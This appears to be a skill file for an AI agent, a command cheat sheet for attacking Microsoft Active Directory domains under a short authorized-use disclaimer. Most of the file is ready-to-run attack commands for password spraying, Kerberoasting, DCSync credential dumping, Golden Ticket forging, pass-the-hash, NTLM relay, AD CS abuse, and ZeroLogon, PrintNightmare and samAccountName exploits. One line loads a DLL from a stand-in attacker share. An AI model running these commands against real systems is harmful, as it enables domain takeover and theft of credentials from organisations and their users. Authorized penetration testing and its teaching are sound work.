---
name: active-directory-attacks
description: "Authorized Active Directory penetration testing techniques for reconnaissance, credential attacks, Kerberos ticket abuse, NTLM relay, AD CS, and critical CVE exploitation. Use when the user asks to attack or test an AD domain, Kerberoasting, DCSync, pass-the-hash, BloodHound, Golden or Silver tickets, AS-REP roasting, LDAP enumeration, ACL abuse, delegation attacks, or domain privilege escalation."
---

# Active Directory Attacks

Authorized use only: run these techniques only against domains you own or have written permission to test. Unauthorized use is illegal.

This skill covers core Microsoft Active Directory attack techniques for red teams and penetration testers: reconnaissance, credential harvesting, Kerberos abuse, lateral movement, privilege escalation, and domain dominance.

## When to use

- Authorized Windows domain penetration testing or red-team exercises.
- The user asks for AD enumeration, attack paths, credential extraction, Kerberos ticket abuse, NTLM relay, AD CS abuse, or specific CVE exploitation.
- You have network access to a Domain Controller and valid domain credentials where required.

## Prerequisites

- Kali Linux or Windows attack platform.
- Network access to the Domain Controller.
- Domain user credentials for most attacks.
- Tools: BloodHound, Impacket, Mimikatz, Rubeus, CrackMapExec, PowerView, Responder, and Certipy where relevant.
- Synchronize the attacker clock with the DC before Kerberos attacks (within 5 minutes).

## Essential tools

| Tool | Purpose |
|------|---------|
| BloodHound | AD attack path visualization |
| Impacket | Python AD attack tools |
| Mimikatz | Credential extraction |
| Rubeus | Kerberos attacks |
| CrackMapExec | Network exploitation |
| PowerView | AD enumeration |
| Responder | LLMNR/NBT-NS poisoning |
| Certipy | AD CS enumeration and abuse |

## Clock synchronization

```bash
nmap -sT 10.10.10.10 -p445 --script smb2-time
sudo date -s "14 APR 2024 18:25:16"
net time /domain /set
faketime -f '+8h' <command>
```

## Reconnaissance

BloodHound:

```bash
neo4j console
bloodhound --no-sandbox
.\SharpHound.exe -c All
.\SharpHound.exe -c All --ldapusername user --ldappassword pass
bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all
```

PowerView:

```powershell
Get-NetDomain
Get-DomainSID
Get-NetDomainController
Get-NetUser
Get-NetUser -SamAccountName targetuser
Get-UserProperty -Properties pwdlastset
Get-NetGroupMember -GroupName 'Domain Admins'
Get-DomainGroup -Identity 'Domain Admins' | Select-Object -ExpandProperty Member
Find-LocalAdminAccess -Verbose
Invoke-UserHunter
Invoke-UserHunter -Stealth
```

## Credential attacks

Password spraying:

```bash
./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
```

Kerberoasting:

```bash
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt
.\Rubeus.exe kerberoast /outfile:hashes.txt
crackmapexec ldap 10.10.10.10 -u user -p password --kerberoast output.txt
hashcat -m 13100 hashes.txt rockyou.txt
```

AS-REP roasting:

```bash
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
hashcat -m 18200 hashes.txt rockyou.txt
```

DCSync (requires Replicating Directory Changes rights):

```bash
secretsdump.py domain.local/admin:password@10.10.10.10 -just-dc-user krbtgt
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /user:Administrator
```

## Kerberos ticket attacks

Golden Ticket:

```powershell
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /id:500 /ptt
```

```bash
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
```

Silver Ticket:

```powershell
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

Pass-the-Hash:

```bash
psexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
wmiexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
smbexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH -d domain.local
crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH --local-auth
```

OverPass-the-Hash:

```bash
getTGT.py domain.local/user -hashes :NTHASH
export KRB5CCNAME=user.ccache
.\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
```

## NTLM relay

```bash
responder -I eth0 -wrf
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t ldaps://dc.domain.local -wh attacker-wpad --delegate-access
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt
```

Disable SMB and HTTP in Responder when relaying those protocols.

## AD CS

ESC1:

```bash
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10
certipy req -u user@domain.local -p password -ca CA-NAME -target dc.domain.local -template VulnTemplate -upn administrator@domain.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

ESC8:

```bash
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

## Critical CVEs

ZeroLogon (CVE-2020-1472):

```bash
crackmapexec smb 10.10.10.10 -u '' -p '' -M zerologon
python3 cve-2020-1472-exploit.py DC01 10.10.10.10
secretsdump.py -just-dc domain.local/DC01\$@10.10.10.10 -no-pass
python3 restorepassword.py domain.local/DC01@DC01 -target-ip 10.10.10.10 -hexpass HEXPASSWORD
```

PrintNightmare (CVE-2021-1675):

```bash
rpcdump.py @10.10.10.10 | grep 'MS-RPRN'
python3 CVE-2021-1675.py domain.local/user:pass@10.10.10.10 '\\attacker\share\evil.dll'
```

samAccountName spoofing (CVE-2021-42278/42287):

```bash
python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
```

## Quick reference

| Attack | Tool | Command |
|-------|------|---------|
| Kerberoast | Impacket | `GetUserSPNs.py domain/user:pass -request` |
| AS-REP Roast | Impacket | `GetNPUsers.py domain/ -usersfile users.txt` |
| DCSync | secretsdump | `secretsdump.py domain/admin:pass@DC` |
| Pass-the-Hash | psexec | `psexec.py domain/user@target -hashes :HASH` |
| Golden Ticket | Mimikatz | `kerberos::golden /user:Admin /krbtgt:HASH` |
| Spray | kerbrute | `kerbrute passwordspray -d domain users.txt Pass` |

## Constraints

Must:

- Synchronize time with the DC before Kerberos attacks.
- Have valid domain credentials for most attacks.
- Document all compromised accounts and changes.
- Restore the DC machine account password after ZeroLogon testing.

Must not:

- Lock out accounts with excessive password spraying.
- Modify production AD objects without approval.
- Leave Golden Tickets or persistence without documentation.
- Run against systems without authorization.

Should:

- Run BloodHound for attack path discovery.
- Check SMB signing before relay attacks.
- Verify patch levels before CVE exploitation.

## Examples

Example 1: Domain compromise via Kerberoasting

```bash
GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10
GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10 -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt
psexec.py domain.local/svc_admin:CrackedPassword@10.10.10.10
```

Example 2: NTLM relay to LDAP

```bash
ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access
python3 printerbug.py domain.local/user:pass@target 10.10.10.12
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Clock skew too great | Sync time with the DC or use faketime |
| Kerberoasting returns empty | No service accounts with SPNs |
| DCSync access denied | Need Replicating Directory Changes rights |
| NTLM relay fails | Check SMB signing, try an LDAP target |
| BloodHound empty | Verify the collector ran with correct creds |

## Related skills

Load these when the task spans more than this skill.

- [`network-service-pentesting`](../network-service-pentesting/SKILL.md) — Assess SSH and SMTP services for weak configurations, credential exposure, vulnerabilities, open relays, tunne…
- [`pentest-methodology`](../pentest-methodology/SKILL.md) — Plan and run authorized penetration tests: scope, reconnaissance, scanning, exploitation, post-exploitation, r…
- [`cloud-pentesting`](../cloud-pentesting/SKILL.md) — Assess authorized AWS, Azure, and GCP environments: reconnaissance, IAM and resource enumeration, metadata and…
- [`secrets-management`](../secrets-management/SKILL.md) — Manage secrets for CI/CD and runtime systems with Vault, AWS Secrets Manager, GitHub/GitLab variables, Kuberne…
- [`wireshark-analysis`](../wireshark-analysis/SKILL.md) — Capture, filter, and analyze network traffic with Wireshark. Use for PCAP/PCAPNG analysis, live packet capture…
